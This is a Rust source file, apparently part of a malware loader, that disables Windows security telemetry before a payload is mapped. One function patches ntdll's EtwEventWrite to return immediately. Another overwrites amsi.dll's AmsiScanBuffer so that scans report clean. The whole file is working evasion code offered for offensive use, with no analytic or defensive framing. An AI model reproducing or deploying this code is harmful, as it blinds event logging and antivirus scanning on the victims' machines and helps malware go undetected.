//! Best-effort ETW/AMSI patches for the loader process. Runs before the
//! payload is mapped so user-mode telemetry from the host process is reduced.
//! Kernel callbacks and ETW-TI are not affected.
#![allow(dead_code)]

use windows::core::{s, PCSTR};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{VirtualProtect, PAGE_EXECUTE_READWRITE, PAGE_PROTECTION_FLAGS};

fn resolve(dll: PCSTR, sym: PCSTR) -> Option<*mut core::ffi::c_void> {
    unsafe {
        let h = GetModuleHandleA(dll).ok()?;
        GetProcAddress(h, sym).map(|f| f as usize as *mut core::ffi::c_void)
    }
}

/// Patch `ntdll!EtwEventWrite` with `ret`.
pub fn patch_etw() {
    unsafe {
        let Some(p) = resolve(s!("ntdll.dll"), s!("EtwEventWrite")) else {
            return;
        };
        let addr = p as *const core::ffi::c_void;
        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(addr, 1, PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
            *(p as *mut u8) = 0xC3;
            let _ = VirtualProtect(addr, 1, old, &mut old);
        }
    }
}

/// Make `amsi.dll!AmsiScanBuffer` return E_INVALIDARG (`clean`).
pub fn patch_amsi() {
    unsafe {
        let Some(p) = resolve(s!("amsi.dll"), s!("AmsiScanBuffer")) else {
            return;
        };
        // mov eax, 0x80070057; ret
        const STUB: [u8; 6] = [0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3];
        let addr = p as *const core::ffi::c_void;
        let mut old = PAGE_PROTECTION_FLAGS(0);
        if VirtualProtect(addr, STUB.len(), PAGE_EXECUTE_READWRITE, &mut old).is_ok() {
            std::ptr::copy_nonoverlapping(STUB.as_ptr(), p as *mut u8, STUB.len());
            let _ = VirtualProtect(addr, STUB.len(), old, &mut old);
        }
    }
}
